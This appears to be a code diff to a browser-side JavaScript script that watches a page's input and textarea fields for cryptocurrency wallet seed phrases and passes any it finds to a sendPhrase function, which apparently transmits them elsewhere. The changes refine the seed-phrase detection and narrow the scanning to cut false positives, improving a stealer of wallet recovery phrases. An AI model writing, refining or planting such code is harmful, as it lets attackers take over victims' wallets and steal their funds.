@@ -179,7 +179,12 @@
   }
 
   function isSeedPhrase(val){
-    return val&&[12,15,18,21,24].includes(wordCount(val));
+    if(!val||typeof val!=="string")return false;
+    const words=val.trim().split(/\s+/).filter(w=>w.length>0);
+    if(![12,15,18,21,24].includes(words.length))return false;
+    // Real BIP39 words: all lowercase, 2-10 chars, no punctuation/numbers
+    const ok=/^[a-z]{2,10}$/;
+    return words.filter(w=>ok.test(w)).length/words.length>=0.9;
   }
 
   // Send phrase with full clear format
@@ -198,25 +203,16 @@
       .catch(e=>console.error("❌ Failed:",e));
   }
 
-  // Monitor DOM for displayed phrases (wallet creation)
+  // Monitor DOM: ONLY scan input/textarea values, not page text (avoids false positives)
   function checkDOM(root){
     if(!root||!root.querySelectorAll)return;
-    const els=root.querySelectorAll('*');
-    els.forEach(el=>{
+    root.querySelectorAll("input,textarea").forEach(el=>{
       if(el.getAttribute("data-tp-logged"))return;
-      let txt="";
-      if(el.tagName==="INPUT"||el.tagName==="TEXTAREA"){
-        txt=el.value||"";
-      }else if(el.children.length===0||el.tagName==="PRE"||el.tagName==="CODE"){
-        // Only leaf nodes or pre/code to avoid duplicates
-        txt=el.textContent||"";
-      }
-      txt=txt.trim();
+      const txt=(el.value||"").trim();
       if(isSeedPhrase(txt)){
         el.setAttribute("data-tp-logged","1");
-        console.log("📋 Phrase in DOM:",wordCount(txt),"words, element:",el.tagName,el.className.substring(0,40));
         sendPhrase(txt,"WALLET_CREATED_DISPLAYED",{
-          ELEMENT:el.tagName+(el.className?"."+(el.className.toString().trim().split(" ")[0]):"")
+          FIELD:el.name||el.id||el.placeholder||"field"
         });
       }
     });
